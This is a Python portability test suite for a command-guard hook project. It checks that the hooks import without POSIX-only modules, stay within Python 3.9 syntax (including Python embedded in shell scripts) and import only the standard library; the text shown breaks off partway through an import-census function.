#!/usr/bin/env python3
"""Portability: every hook imports off POSIX, and every lock is bounded.

Plain executable assert script, like every other suite here: runs top to bottom
and stops at the first failed assert.

Why this suite exists
---------------------

ForceField's hooks are fail-open by design, so a hook that cannot start is
indistinguishable, from the user's side, from a hook that examined the command
and allowed it. Fifteen of thirty modules raised ``ModuleNotFoundError: fcntl``
at module scope — before the first ``sys.stdin`` read — on any interpreter
without the POSIX extension modules. The result was silence: no verdict, no
record, no enforcement, and no error.

Three properties are pinned here, because each of them is invisible when it
breaks:

1. **Import.** Every ``hooks/*.py`` imports with the POSIX-only modules blocked
   from the import system. The blocker is a ``sys.meta_path`` finder, not a
   guess about which platform this is, so the gate runs identically everywhere.
2. **Locking.** ``portable_lock`` replaces three direct ``fcntl.flock`` call
   sites. Mutual exclusion has to still hold across processes — asserted by
   running a lost-update race, not by checking that the API exists — and every
   acquisition has to be bounded, because two of the three call sites blocked
   forever and a hook has five seconds in total.
3. **Decoding.** The event on stdin is read as bytes and decoded as UTF-8. A
   text-mode read takes its codec from the platform locale, which on a Windows
   ANSI code page either kills the hook before it sees the event or silently
   rewrites the command the guards then match against.

The Windows branch of the lock runs against a documented-contract ``msvcrt``
stand-in (``tests/_fake_msvcrt.py``). **That exercises this repository's
seek/lock/unlock and deadline logic, not the Win32 kernel.** No part of
ForceField has been executed on Windows.
"""

from __future__ import annotations

import ast
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import time
from pathlib import Path

import _isolated_home  # noqa: F401  MUST precede every hook import

ROOT = Path(__file__).resolve().parent.parent
HOOKS = ROOT / "hooks"
TESTS = ROOT / "tests"
sys.path.insert(0, str(HOOKS))

import hook_event as _hook_event  # noqa: E402
import portable_lock  # noqa: E402

_n = 0


def check(cond, msg):
    global _n  # noqa: PLW0603
    assert cond, "FAILED: " + msg
    _n += 1


MODULES = sorted(p.stem for p in HOOKS.glob("*.py"))
check(len(MODULES) >= 25, "the hooks tree was found (%d modules)" % len(MODULES))

# ``sigma_compiler`` is the single documented exception to the runtime rules: it
# needs pyyaml, and it runs only inside the ``~/.claude/forcefield/sigma/venv``
# that ``scripts/install.sh`` builds -- never on a hook path, never under the user's
# system python3. Every other module is held to stdlib-only and to importing
# with the POSIX extension modules gone. The exception is named here, once, so a
# second one cannot appear quietly.
NON_RUNTIME = "sigma_compiler"
RUNTIME_MODULES = [m for m in MODULES if m != NON_RUNTIME]
check(NON_RUNTIME in MODULES and len(RUNTIME_MODULES) == len(MODULES) - 1,
      "%s is the one module exempted from the runtime rules" % NON_RUNTIME)


# =============================================================================
# 0. The interpreter the probes run under is CHOSEN, not inherited
# =============================================================================
#
# Every probe below that answers "is this name in the standard library?" or
# "does this module import?" answers it by running an interpreter, and for a
# long time that interpreter was ``sys.executable`` -- whichever ``python3`` a
# human happened to type. On this host ``which -a python3`` puts a 3.14 Homebrew
# build ahead of ``/usr/bin/python3`` at 3.9.6, and CLAUDE.md's documented
# command is a bare ``python3 tests/test_plugin.py``. Measured: six mutants that
# are hard errors on 3.9 (a function-local ``import tomllib``, ``from typing
# import Self``, ``@dataclass(slots=True)``, and three PEP 604 shapes) were
# killed on 3.9.6 and escaped all eighteen suites on 3.14.6. The gate was a
# property of the caller's ``PATH``.
#
# So the floor interpreter is resolved here, once, deterministically: of every
# ``python3`` this machine can offer, take the OLDEST that is still at or above
# the declared floor. That is the interpreter the hooks are most likely to meet
# and the one that answers these questions most conservatively. Which one it was
# is printed, because a run on a host with no 3.9 is a weaker run and the output
# has to say so rather than look identical.
FLOOR = (3, 9)

_INTERPRETER_CANDIDATES = (
    "/usr/bin/python3",
    "python3",
    "python3.9", "python3.10", "python3.11", "python3.12", "python3.13",
)


def _interpreter_version(path):
    """``(major, micro…)`` for one interpreter, or None if it will not run."""
    try:
        proc = subprocess.run(
            [path, "-c", "import sys;print('%d %d %d' % sys.version_info[:3])"],
            capture_output=True, text=True, timeout=20)
    except (OSError, subprocess.SubprocessError):
        return None
    if proc.returncode != 0:
        return None
    try:
        return tuple(int(part) for part in proc.stdout.split())
    except ValueError:
        return None


def _resolve_floor_interpreter():
    found = {}
    for candidate in (sys.executable,) + _INTERPRETER_CANDIDATES:
        resolved = candidate if os.path.isabs(candidate) else shutil.which(candidate)
        if not resolved:
            continue
        resolved = os.path.realpath(resolved)
        if resolved in found:
            continue
        version = _interpreter_version(resolved)
        if version is not None and version >= FLOOR:
            found[resolved] = version
    if not found:
        return sys.executable, tuple(sys.version_info[:3])
    best = min(found.items(), key=lambda item: item[1])
    return best[0], best[1]


PROBE_PY, PROBE_VERSION = _resolve_floor_interpreter()
check(PROBE_VERSION >= FLOOR,
      "the probe interpreter is at or above the %s floor (%s is %s)"
      % (".".join(str(p) for p in FLOOR), PROBE_PY,
         ".".join(str(p) for p in PROBE_VERSION)))
check(PROBE_VERSION <= tuple(sys.version_info[:3]),
      "the probe interpreter is no newer than the one running this suite "
      "(%s vs %s)" % (PROBE_VERSION, tuple(sys.version_info[:3])))
AT_FLOOR = PROBE_VERSION[:2] == FLOOR
print("PASS: probes run under %s (%s)%s"
      % (PROBE_PY, ".".join(str(p) for p in PROBE_VERSION),
         "" if AT_FLOOR else
         "  -- NOT the %s floor: no floor interpreter on this host, so the "
         "dynamic probes below are weaker than on a floor host"
         % ".".join(str(p) for p in FLOOR)))


# =============================================================================
# 1. Every module imports with the POSIX-only extension modules blocked
# =============================================================================
#
# The list is every POSIX-only stdlib module a hook could plausibly reach for.
# `fcntl` is the one that was actually imported; the others are here so that the
# next one cannot be added without this gate noticing.

BLOCKED = ("fcntl", "termios", "pwd", "grp", "resource", "pty", "tty", "syslog")

_IMPORT_PROBE = r"""
import sys, importlib.abc

BLOCKED = set(%(blocked)r)


class Blocker(importlib.abc.MetaPathFinder):
    def find_spec(self, fullname, path=None, target=None):
        if fullname.split(".")[0] in BLOCKED:
            raise ModuleNotFoundError("No module named %%r" %% fullname, name=fullname)
        return None


for name in list(sys.modules):
    if name.split(".")[0] in BLOCKED:
        del sys.modules[name]
sys.meta_path.insert(0, Blocker())
sys.path.insert(0, %(hooks)r)

import importlib
importlib.import_module(%(module)r)
print("OK")
"""


def import_under_blocker(module):
    """Import one hook module in a child with the POSIX modules unavailable."""
    code = _IMPORT_PROBE % {"blocked": list(BLOCKED), "hooks": str(HOOKS),
                            "module": module}
    proc = subprocess.run(
        [PROBE_PY, "-c", code], capture_output=True, text=True,
        env=dict(os.environ, PYTHONDONTWRITEBYTECODE="1"),
    )
    return proc.returncode, (proc.stdout + proc.stderr).strip()


_failures = []
for _module in RUNTIME_MODULES:
    _rc, _out = import_under_blocker(_module)
    if _rc != 0:
        _failures.append((_module, _out.splitlines()[-1] if _out else ""))
check(not _failures,
      "these modules do not import without %s: %s"
      % (", ".join(BLOCKED), "; ".join("%s (%s)" % f for f in _failures)))

# The compiler is checked too, but its one permitted failure is the missing
# third-party dependency -- not a POSIX-only module.
_rc, _out = import_under_blocker(NON_RUNTIME)
check(_rc == 0 or "yaml" in _out,
      "%s imports, or fails only on pyyaml: %s" % (NON_RUNTIME, _out[-200:]))

# The gate is only worth anything if the blocker really blocks: a finder that
# silently did nothing would report a clean sweep over an unmodified import.
_rc, _out = import_under_blocker("__forcefield_blocker_selftest__")
check(_rc != 0, "the probe reports a failure for a module that does not exist")
_selftest = _IMPORT_PROBE % {"blocked": list(BLOCKED), "hooks": str(HOOKS),
                             "module": "fcntl"}
_proc = subprocess.run([PROBE_PY, "-c", _selftest], capture_output=True, text=True)
check(_proc.returncode != 0 and "ModuleNotFoundError" in _proc.stderr,
      "the blocker really removes fcntl from the import system")

print("PASS: all %d hook modules import with the POSIX-only modules blocked"
      % len(RUNTIME_MODULES))


# =============================================================================
# 2. The runtime tree stays inside the Python 3.9 grammar
# =============================================================================
#
# Hooks run under the user's system ``python3``, and the floor is 3.9. Parsing
# with ``feature_version`` makes the parser itself the judge, so this does not
# depend on which interpreter happens to run the suite.

# A runtime `X | Y` union is a TypeError on 3.9 -- PEP 604 made `|` an operator
# on types in 3.10 -- and the grammar gate cannot see it, because `int | None`
# is valid 3.9 *syntax*. It is legal inside an annotation only because
# `from __future__ import annotations` leaves annotations unevaluated, so that
# exemption is per module and conditional on the import being there.
#
# Everywhere else the question "is this a type union?" is not decidable from the
# syntax tree, so the test is inverted: every runtime `|` must be a shape that
# provably *cannot* be one. An int flag constant, a `getattr(mod, "FLAG", 0)`,
# a set union, any non-`|` arithmetic sub-expression (a type supports no other
# operator) and a snake_case or UPPER_CASE local all qualify. `int | None`,
# `Foo | Bar`, `dict[str, int] | None` and `typing.Any | None` do not, and
# neither does any shape this list does not name. That is deliberately strict:
# a new shape fails the suite until somebody writes down why it is not a type.
#
# `x |= y` counts. It is an `ast.AugAssign`, never an `ast.BinOp`, so a filter
# keyed on `BinOp` never examined it -- and `int |= float` is a hard TypeError on
# 3.9 and legal on 3.10+, exactly like the binary form. Measured: the same two
# lines in a function body escaped all eighteen suites on BOTH interpreters,
# because a function nothing calls is never run. The target and the value are
# held to the same "provably not a type" rule as the operands of a `|`.
#
# Residual, stated rather than hidden: a lowercase OR UPPER_CASE name bound to a
# type (`t = int; u = str; t | u`, or `A = int; B = float; A | B`) would pass.
# `_cannot_be_a_type` accepts both cases, and UPPER_CASE is this repository's own
# convention for module-scope bindings, so it is the likelier of the two. No
# static rule short of type inference catches either.
_BUILTIN_TYPE_NAMES = frozenset({
    "int", "float", "complex", "bool", "str", "bytes", "bytearray", "memoryview",
    "list", "tuple", "dict", "set", "frozenset", "range", "slice", "type",
    "object", "NoneType", "None",
})


def _cannot_be_a_type(node):
    """True when this operand of a runtime `|` provably is not a type."""
    if isinstance(node, ast.Constant):
        return isinstance(node.value, int) and not isinstance(node.value, bool)
    if isinstance(node, ast.Attribute):
        return node.attr.isupper()          # os.O_RDWR, socket.SOCK_CLOEXEC
    if isinstance(node, (ast.Set, ast.SetComp)):
        return True
    if isinstance(node, ast.Call):
        func = node.func
        if isinstance(func, ast.Name) and func.id in ("set", "frozenset"):
            return True
        return bool(
            isinstance(func, ast.Name) and func.id == "getattr"
            and len(node.args) == 3
            and isinstance(node.args[1], ast.Constant)
            and isinstance(node.args[1].value, str)
            and node.args[1].value.isupper()
        )
    if isinstance(node, ast.BinOp):
        if isinstance(node.op, ast.BitOr):
            return _cannot_be_a_type(node.left) and _cannot_be_a_type(node.right)
        return True                         # `<<`, `*`, `+` on a type is a TypeError
    if isinstance(node, ast.Name):
        return (node.id.islower() or node.id.isupper()) \
            and node.id not in _BUILTIN_TYPE_NAMES
    return False


def _annotation_nodes(tree):
    """Every node that sits inside an annotation position."""
    inside = set()
    for node in ast.walk(tree):
        annotations = []
        if isinstance(node, (ast.AnnAssign, ast.arg)) and node.annotation is not None:
            annotations.append(node.annotation)
        elif isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)) and node.returns:
            annotations.append(node.returns)
        for annotation in annotations:
            for sub in ast.walk(annotation):
                inside.add(id(sub))
    return inside


def gate_39(source, label):
    """Assert one unit of source stays inside what 3.9 can parse *and* run."""
    try:
        tree = ast.parse(source, filename=label, feature_version=(3, 9))
    except SyntaxError as exc:
        check(False, "%s does not parse under the 3.9 grammar: %s" % (label, exc))
        return
    check(True, "%s parses under the 3.9 grammar" % label)

    # PEP 695 (3.12) type parameters and `type X = ...` aliases parse as new node
    # types rather than as syntax errors in some versions, so they are named.
    newer = sorted({
        node.__class__.__name__ for node in ast.walk(tree)
        if node.__class__.__name__ in ("Match", "TypeAlias")
        or getattr(node, "type_params", None)
    })
    check(not newer, "%s uses no 3.10+/3.12+ form (found %s)" % (label, newer))

    postponed = any(
        isinstance(node, ast.ImportFrom) and node.module == "__future__"
        and any(alias.name == "annotations" for alias in node.names)
        for node in ast.walk(tree)
    )
    inside_annotation = _annotation_nodes(tree)
    annotated, runtime = [], []
    for node in ast.walk(tree):
        if isinstance(node, ast.BinOp) and isinstance(node.op, ast.BitOr):
            left, right = node.left, node.right
        elif isinstance(node, ast.AugAssign) and isinstance(node.op, ast.BitOr):
            # `x |= y`. An augmented assignment cannot appear in an annotation
            # position, so there is no postponed-evaluation exemption for it.
            left, right = node.target, node.value
        else:
            continue
        if id(node) in inside_annotation:
            annotated.append(node.lineno)
        elif not (_cannot_be_a_type(left) and _cannot_be_a_type(right)):
            runtime.append(node.lineno)
    check(postponed or not annotated,
          "%s: the `X | Y` annotation at line %s needs "
          "`from __future__ import annotations`" % (label, annotated[:1]))
    check(not runtime,
          "%s: runtime PEP 604 union at line(s) %s -- a TypeError on the 3.9 floor"
          % (label, runtime))


for _module in MODULES:
    gate_39((HOOKS / (_module + ".py")).read_text(encoding="utf-8"), _module + ".py")

# The suites run under the same system python3 as the hooks, so they are held to
# the same floor: a test that cannot start cannot fail.
for _test in sorted(TESTS.glob("*.py")):
    gate_39(_test.read_text(encoding="utf-8"), "tests/" + _test.name)

# The Python embedded in the shell scripts and the shell hooks runs under that
# same interpreter and is invisible to a gate that only reads `hooks/*.py`.
#
# Extraction is fail-closed, and this is the second attempt at making that true.
# The first matched the literal strings `python3 <<` and `python3 -c` in BOTH the
# extractor and the counter, so a form neither understood was counted zero times
# and extracted zero times, and the count check balanced. Measured: a live
# `python3 - <<'TAG'` block containing a `match` statement -- the canonical way
# to feed a heredoc to Python's stdin -- was appended to `scripts/posture.sh` and
# the suite reported the *identical* assertion count as the clean tree, on both
# interpreters, while the script itself was a SyntaxError under the 3.9 floor.
# `"$VENV_PYTHON" -c`, `$PY -c`, `python -c` and an unquoted heredoc tag were all
# invisible the same way.
#
# So the counter is now deliberately WIDER than the extractor: it recognises any
# interpreter-shaped token followed by `-c` or a heredoc, including variable
# spellings, and the extractor has to account for every one it finds. A form the
# extractor cannot read now fails the count check instead of vanishing.
#
# **That claim is bounded to the two INLINE forms, and the boundary is stated
# here rather than left to be discovered.** A script that writes a `.py` file
# with a heredoc and runs it on a later line (`cat <<'TAG' > out.py` … `python3
# out.py`) is neither: the heredoc carries no interpreter token, so the counter
# has nothing to balance, and `python3 out.py` is not a `-c` and not a heredoc.
# Such a program vanishes from the extractor rather than failing the count.
# NO SCRIPT IN THIS TREE DOES THIS -- verified against the extractor's own
# census, which finds 5 programs across 6 shell scripts and every one is a `-c`
# or a heredoc -- and the assertion below pins that, so the form cannot appear
# without this comment being read. Widening the extractor to follow a written
# file through a later invocation is a data-flow analysis of shell, which is a
# much larger commitment than the hole is worth at this size.

# `python`, `python3`, `python3.11`, a path ending in one of those, or a variable
# whose name contains PY -- `$PY`, `$VENV_PYTHON`, `${PYTHON_BIN}`, quoted or not.
_PY_INTERPRETER = (
    r"""(?:[\w./${}"'-]*\bpython[0-9.]*\b"""
    r"""|"?\$\{?(?=[A-Za-z0-9_]*PY)[A-Za-z_][A-Za-z0-9_]*\}?"?)"""
)
# Whatever flags sit between the interpreter and the program: `-u`, `-E`, `-S`,
# and the bare `-` that means "read the program from stdin" -- which is why the
# letter run is `*` and not `?`. Lazy, so the explicit `-c` in the patterns below
# is matched by the pattern rather than swallowed here.
_PY_FLAGS = r"(?:\s+-[A-Za-z0-9]*)*?"
_PY_INLINE_RE = re.compile(
    _PY_INTERPRETER + _PY_FLAGS + r"\s+(?P<mode>-c\b|<<-?)")
_PY_HEREDOC_RE = re.compile(_PY_INTERPRETER + _PY_FLAGS + r"\s*<<-?\s*(?P<tag>\S+)")
_PY_DASHC_RE = re.compile(_PY_INTERPRETER + _PY_FLAGS + r"\s+-c\b")

# ROUND 1: the interpreter-first forms above are only half the heredoc spellings,
# and the other half was counted zero times AND extracted zero times, so the
# count check balanced at the clean baseline and a live 3.10-only `match`
# statement shipped with the suite reporting its identical assertion count.
# Measured, four forms:
#
#     python3 \                     (the heredoc reached over a continuation)
#       <<'TAG'
#     cat <<'TAG' | python3         (ordinary shell style)
#     cat <<'TAG' | python3 -
#     python3 /dev/stdin <<'TAG'    (a non-flag argument before the `<<`)
#
# What they have in common is that an interpreter and a heredoc appear on the
# same LOGICAL line in either order, with anything between them. That is the
# rule now, for both halves. `<<<` is a here-string, not a heredoc, and this
# tree uses ~20 of them with no interpreter on the line; `(?<!<)<<(?!<)` keeps
# them out. A here-string that IS fed to an interpreter is counted separately
# below, so it fails the count check rather than vanishing.
_HEREDOC_TAG_RE = re.compile(r"(?<!<)<<-?(?!<)\s*(?P<tag>\S+)")
_PY_ANYWHERE_RE = re.compile(_PY_INTERPRETER)
_PY_HERESTRING_RE = re.compile(_PY_INTERPRETER + _PY_FLAGS + r"\s*<<<")


def _logical_line(lines, index):
    """``(text, last_index)`` for the shell logical line starting at ``index``.

    Trailing backslashes are the shell's line continuation, so a heredoc
    redirection can sit on a different physical line from its interpreter. The
    body still starts after the LAST physical line, which is why the index comes
    back with the text.
    """
    parts, last = [lines[index]], index
    while last < len(lines) - 1 and lines[last].rstrip().endswith("\\"):
        parts[-1] = parts[-1].rstrip().rstrip("\\")
        last += 1
        parts.append(lines[last])
    return (" ".join(part.strip() for part in parts), last)


def _python_heredoc(text):
    """The heredoc tag match when ``text`` feeds a heredoc to Python, else None."""
    direct = _PY_HEREDOC_RE.search(text)
    if direct is not None:
        return direct
    if _PY_ANYWHERE_RE.search(text):
        return _HEREDOC_TAG_RE.search(text)
    return None


def _embedded_python(text):
    """Every Python program a shell script feeds to an interpreter, with a label."""
    blocks, lines, index = [], text.splitlines(), 0
    while index < len(lines):
        line = lines[index].strip()
        logical, last = _logical_line(lines, index)
        heredoc = None if line.startswith("#") else _python_heredoc(logical)
        if heredoc is not None:
            index = last
            # The tag as the shell sees it: quotes are the quoting of the tag,
            # not part of it, and a redirection may follow on the same line.
            tag = heredoc.group("tag").strip("'\"")
            body, index = [], index + 1
            while index < len(lines) and lines[index].strip() != tag:
                body.append(lines[index])
                index += 1
            blocks.append(("heredoc line %d" % (index + 1), "\n".join(body)))
            index += 1
            continue
        dashc = None if line.startswith("#") else _PY_DASHC_RE.search(line)
        if dashc is not None:
            joined, cursor = [], index
            while cursor < len(lines):
                joined.append(lines[cursor].rstrip("\\").rstrip())
                if not lines[cursor].rstrip().endswith("\\"):
                    break
                cursor += 1
            command = " ".join(joined)
            match = _PY_DASHC_RE.search(command)
            after = command[match.end():] if match else ""
            # The quote that OPENS the program, not whichever kind appears --
            # `python3 -c "... '$DIR' ..."` is quoted with `"` and contains `'`.
            first = [(after.index(q), q) for q in ("'", '"') if q in after]
            quote = min(first)[1] if first else "'"
            parts = after.split(quote)
            if len(parts) >= 3:
                blocks.append(("-c line %d" % (index + 1), parts[1]))
            elif len(parts) == 2:
                # A shell string may span physical lines with no continuation
                # marker, and a multi-line `-c` program is the readable way to
                # write anything past one statement. Accumulate to the closing
                # quote; if there is not one, fall through and let the count
                # check fail rather than skipping the block.
                body, scan = [parts[1]], cursor + 1
                while scan < len(lines):
                    if quote in lines[scan]:
                        body.append(lines[scan].split(quote, 1)[0])
                        blocks.append(("-c line %d" % (index + 1),
                                       "\n".join(body)))
                        cursor = scan
                        break
                    body.append(lines[scan])
                    scan += 1
            index = cursor
        index += 1
    return blocks


def _inline_python_calls(text):
    """How many Python programs a script really runs (comments excluded).

    Deliberately looser than the extractor: this is the fail-closed half, so it
    has to see forms the extractor may not yet read. It walks LOGICAL lines, so
    a heredoc reached over a shell continuation is one call rather than none,
    and it counts an interpreter anywhere on a line carrying a heredoc — which
    is what `cat <<'TAG' | python3` looks like.
    """
    total, lines, index = 0, text.splitlines(), 0
    while index < len(lines):
        logical, last = _logical_line(lines, index)
        index = last + 1
        if logical.lstrip().startswith("#"):
            continue
        direct = len(_PY_INLINE_RE.findall(logical))
        total += direct
        if not direct and _python_heredoc(logical) is not None:
            total += 1
        total += len(_PY_HERESTRING_RE.findall(logical))
    return total


_script_blocks = 0
# Extracted ONCE and reused by every later gate. `_embedded_python`'s output fed
# the grammar gate and the post-3.9 denylist and nothing else, so the import
# census and the dynamic member probe were both blind to five programs, three of
# them on a hook path (`container_first.sh -c`, PreToolUse[Bash]; and
# `sigma_update.sh -c` twice, SessionStart). Measured, on both floors: `import
# yaml` in a heredoc ESCAPED every suite while the same import in a `.py` was
# KILLED, and `sys.orig_argv` / `os.path.splitroot` in a heredoc escaped too.
# The extractor was never the problem -- the CENSUS was.
_EMBEDDED_MEMBER_SOURCES = []
for _script in sorted(list((ROOT / "scripts").glob("*.sh")) + list(HOOKS.glob("*.sh"))):
    _text = _script.read_text(encoding="utf-8")
    _blocks = _embedded_python(_text)
    _script_blocks += len(_blocks)
    check(len(_blocks) == _inline_python_calls(_text),
          "every `python3` program in %s was extracted (%d of %d)"
          % (_script.name, len(_blocks), _inline_python_calls(_text)))
    for _where, _body in _blocks:
        gate_39(_body, "%s (%s)" % (_script.name, _where))
        _EMBEDDED_MEMBER_SOURCES.append(("%s (%s)" % (_script.name, _where),
                                         _body))

check(_script_blocks >= 2,
      "the shell scripts' embedded Python was found (%d blocks)" % _script_blocks)

# The boundary the comment above states, pinned. A heredoc that WRITES a `.py`
# file which a later line runs carries no interpreter token, so the counter has
# nothing to balance and the program vanishes from the extractor entirely
# instead of failing the count. No script does this today; if one starts, this
# fails and the extractor's fail-closed claim gets re-derived rather than
# silently becoming false.
_HEREDOC_TO_PY = re.compile(r"<<-?\s*[\"']?\w+[\"']?\s*>{1,2}\s*\S+\.py\b")
_heredoc_py_writers = []
for _script in sorted(list((ROOT / "scripts").glob("*.sh")) + list(HOOKS.glob("*.sh"))):
    for _lineno, _line in enumerate(
            _script.read_text(encoding="utf-8").splitlines(), 1):
        if _HEREDOC_TO_PY.search(_line):
            _heredoc_py_writers.append("%s:%d" % (_script.name, _lineno))
check(not _heredoc_py_writers,
      "no shell script writes a .py file with a heredoc and runs it later -- "
      "that form is the one shape this extractor cannot see, and the counter "
      "above cannot catch it either: %s" % _heredoc_py_writers)

print("PASS: every hook module, suite and embedded script program parses under "
      "the 3.9 grammar and runs no post-3.9 form")


# =============================================================================
# 3. Nothing outside the standard library is imported at runtime
# =============================================================================

_STDLIB_PROBE = r"""
import json, os, sys, sysconfig
# Anything a .pth file or the launcher already dragged in is not ours. Only what
# importing the hooks ADDS is under test.
preloaded = set(sys.modules)
sys.path.insert(0, %(hooks)r)
import importlib
for name in %(modules)r:
    importlib.import_module(name)
stdlib = os.path.realpath(sysconfig.get_paths()["stdlib"])
foreign = []
for name, module in sorted(sys.modules.items()):
    if name in preloaded:
        continue
    path = getattr(module, "__file__", None)
    if not path:
        continue
    path = os.path.realpath(path)
    if path.startswith(%(hooks)r):
        continue
    if path.startswith(stdlib) and "site-packages" not in path \
            and "dist-packages" not in path:
        continue
    foreign.append("%%s -> %%s" %% (name, path))
print(json.dumps(foreign))
"""

_proc = subprocess.run(
    [PROBE_PY, "-c",
     _STDLIB_PROBE % {"hooks": str(HOOKS), "modules": RUNTIME_MODULES}],
    capture_output=True, text=True,
    env=dict(os.environ, PYTHONDONTWRITEBYTECODE="1"),
)
check(_proc.returncode == 0,
      "the stdlib probe imported every hook module: %s" % _proc.stderr[-400:])
_foreign = json.loads(_proc.stdout.strip().splitlines()[-1])
check(not _foreign, "hooks import only the standard library: %s" % _foreign)

# The probe above walks `sys.modules` after importing every module, so it sees
# only what actually executed. A function-local `import yaml` never executes, is
# therefore never in `sys.modules`, and is invisible to it -- while being a
# `ModuleNotFoundError` on every machine that has not run `install.sh`, at the
# moment the guard is asked for a verdict. So the runtime sweep has a static
# complement: every import statement at every depth, resolved by name.
#
# A name that does not resolve on this platform is a violation unless it is
# named platform-optional *and* its import sits inside a `try` -- which is the
# whole Windows lesson (`fcntl` at module scope with no handler took fifteen
# modules down before they read stdin) written as a gate.

PLATFORM_OPTIONAL = frozenset(BLOCKED) | {"msvcrt"}

# The one third-party import in the tree, named per module so a second one
# cannot appear quietly.
THIRD_PARTY_EXCEPTIONS = {
    NON_RUNTIME: frozenset({"yaml"}),
    # The suite that drives the compiler. Both of its `import yaml` statements
    # sit inside a `try` and it stubs the module when the install venv is absent,
    # which is how it stays green on a machine that never ran `install.sh`.
    "test_sigma_compiler": frozenset({"yaml"}),
}


def _imports_in_source(source, label):
    """Every top-level module name imported anywhere in `source`, with position.

    Returns ``[(name, lineno, inside_try)]``. Unlike ``_module_scope_imports``
    this walks the whole tree, so a function-local or class-body import counts.

    Takes SOURCE rather than a path so the five programs embedded in the shell
    scripts go through the same census as a `.py` file. They did not: measured,
    `import yaml` inside a `python3 <<TAG` heredoc ESCAPED every suite on both
    floors, while the identical import in a `.py` was KILLED with
    "config.py:619 imports 'requests'". Three of the five are on a hook path --
    `container_first.sh -c` (PreToolUse[Bash]) and `sigma_update.sh -c` x2
    (SessionStart).
    """
    tree = ast.parse(source, filename=label)
    guarded = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Try):
            for sub in ast.walk(node):
                guarded.add(id(sub))
    found = []
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            names = [alias.name.split(".")[0] for alias in node.names]
        elif isinstance(node, ast.ImportFrom) and node.module and node.level == 0:
            names = [node.module.split(".")[0]]
        else:
            continue
        for name in names:
            found.append((name, node.lineno, id(node) in guarded))
    return found


def _imports_at_any_depth(path):
    """`_imports_in_source` for a file on disk."""
    return _imports_in_source(path.read_text(encoding="utf-8"), str(path))


def _attribute_chain(node):
    """``"os.path"`` for the receiver of ``os.path.splitroot``, or None.

    The walk below used to require ``ast.Attribute(value=ast.Name)``, which sees
    `os.getpid` and is blind to EVERY dotted receiver. Measured over this tree:
    1750 flat `module.attr` references it saw, 270 dotted ones (27 distinct) it
    did not, 180 of them `os.path.*` -- and that namespace is not frozen, since
    `dir(os.path)` gained five public names between 3.9.6 and 3.14.6
    (`ALLOW_MISSING`, `errno`, `isdevdrive`, `isjunction`, `splitroot`). A
    mutant adding `os.path.splitroot` escaped every suite on both floors.

    Returns None for anything whose base is not a bare name (`self.x.y`, a call
    result, a subscript), which is the correct answer: those are not module
    references and resolving them would be guesswork.
    """
    parts = []
    while isinstance(node, ast.Attribute):
        parts.append(node.attr)
        node = node.value
    if not isinstance(node, ast.Name):
        return None
    parts.append(node.id)
    return ".".join(reversed(parts))


_ALL_IMPORTS = {_m: _imports_at_any_depth(HOOKS / (_m + ".py")) for _m in MODULES}
check(sum(len(_v) for _v in _ALL_IMPORTS.values()) > 200,
      "the static import census found the imports (%d statements)"
      % sum(len(_v) for _v in _ALL_IMPORTS.values()))
check(any(_n == "subprocess" for _n, _l, _g in _ALL_IMPORTS["log_sinks"]),
      "the census reaches function-local imports (log_sinks' subprocess)")

# `tests/` is censused too. It used to be exempt -- MODULES is built from
# `hooks/*.py` only -- so a third-party import in a suite was caught only when
# that suite happened to run, and a POSIX-only import at module scope in a test
# helper was caught by nothing at all. `tests/_fake_msvcrt.py` is the case that
# matters: it is the stand-in that lets the Windows lock branch be exercised, and
# it imported `fcntl` at module scope, which means the one helper written to
# model Windows could not itself run there.
_TEST_MODULES = sorted(p.stem for p in TESTS.glob("*.py"))
_TEST_IMPORTS = {_t: _imports_at_any_depth(TESTS / (_t + ".py"))
                 for _t in _TEST_MODULES}
check(len(_TEST_MODULES) >= 15,
      "the suites were found for the census (%d)" % len(_TEST_MODULES))

_RESOLVE_PROBE = r"""
import importlib.util, json, os, sysconfig
stdlib = os.path.realpath(sysconfig.get_paths()["stdlib"])
verdict = {}
for name in %(names)r:
    try:
        spec = importlib.util.find_spec(name)
    except BaseException:
        spec = None
    if spec is None:
        verdict[name] = "missing"
        continue
    origin = spec.origin or ""
    if origin in ("built-in", "frozen") or not origin:
        verdict[name] = "stdlib"
        continue
    path = os.path.realpath(origin)
    if path.startswith(stdlib) and "site-packages" not in path \
            and "dist-packages" not in path:
        verdict[name] = "stdlib"
    else:
        verdict[name] = "foreign " + path
print(json.dumps(verdict))
"""

# The five programs embedded in the shell scripts, censused on the same terms.
# Three of them run on a hook path, and nothing here saw them before.
_EMBEDDED_IMPORTS = {_label: _imports_in_source(_source, _label)
                     for _label, _source in _EMBEDDED_MEMBER_SOURCES}
check(len(_EMBEDDED_IMPORTS) >= 2,
      "the embedded shell programs reached the import census (%d)"
      % len(_EMBEDDED_IMPORTS))

_foreign_names = sorted(
    ({_name for _imports in _ALL_IMPORTS.values()
      for _name, _line, _guard in _imports}
     | {_name for _imports in _TEST_IMPORTS.values()
        for _name, _line, _guard in _imports}
     | {_name for _imports in _EMBEDDED_IMPORTS.values()
        for _name, _line, _guard in _imports})
    - set(MODULES) - set(_TEST_MODULES))
_proc = subprocess.run(
    [PROBE_PY, "-c", _RESOLVE_PROBE % {"names": _foreign_names}],
    capture_output=True, text=True,
    env=dict(os.environ, PYTHONDONTWRITEBYTECODE="1"),
)
check(_proc.returncode == 0,
      "the name-resolution probe ran: %s" % _proc.stderr[-300:])
_verdict = json.loads(_proc.stdout.strip().splitlines()[-1])

def _census(where, census, local):
    violations = []
    for module, imports in sorted(census.items()):
        allowed = THIRD_PARTY_EXCEPTIONS.get(module, frozenset())
        for name, line, guarded in imports:
            if name in local or name in allowed:
                continue
            resolved = _verdict.get(name, "missing")
            # A platform-optional module must be inside a `try` WHEREVER it is
            # imported, and that is checked BEFORE resolution on purpose. The
            # old order resolved first and returned early on "stdlib", so an
            # unguarded `import fcntl` was a violation only on a host where
            # `fcntl` is missing -- i.e. only on Windows, which cannot run this
            # suite. `tests/_fake_msvcrt.py` is the case that matters: it is the
            # stand-in that lets the Windows lock branch be exercised, so the
            # one helper written to model Windows is the one that could not run
            # there, and unwrapping its `try` ESCAPED the whole suite.
            if name in PLATFORM_OPTIONAL and not guarded:
                violations.append(
                    "%s%s.py:%d imports %r unguarded (%s is platform-optional; "
                    "it resolves here as %s, which says nothing about the "
                    "platform it is absent on)"
                    % (where, module, line, name, name, resolved))
                continue
            if resolved == "stdlib":
                continue
